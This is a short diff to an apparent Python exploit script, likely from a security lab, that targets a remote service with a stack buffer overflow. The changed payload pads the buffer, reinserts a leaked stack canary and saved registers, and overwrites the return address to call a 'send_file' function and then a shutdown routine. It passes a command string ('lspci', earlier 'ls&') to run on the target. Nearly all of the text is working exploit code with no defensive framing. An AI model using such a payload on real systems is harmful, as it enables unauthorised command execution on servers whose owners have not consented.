@@ -70,15 +70,13 @@ old_ebx = canary
 
 shutdown = address_3rd - 0x1C7 + 0x32	#vres original return address of post_param
 
+command = "lspci"
 
-
-shellcode = "ls&" 
-
-data = shellcode 
-data +=  89*"!" 
-data += transform_address(guessed_address + 140 + 4)
+data=""
+data +=  92*"!" 
+data += transform_address(guessed_address + 152 + len(command))
 data += 8*"!" + 4*"-" + 4*"-"+4*"!"
-data += transform_address(guessed_address + 2)
+data += transform_address(guessed_address)
 data += 4*"-" 
 data +=  transform_address(canary)
 data +=  transform_address(old_ebx) 
@@ -87,7 +85,7 @@ data +=  transform_address(old_ebp)
 data +=  transform_address(send_file) 
 data +=  transform_address(shutdown)
 data +=  transform_address(guessed_address+152)
-data += "lspci"
+data +=  command
 data += '\0'
 
 s = Session()
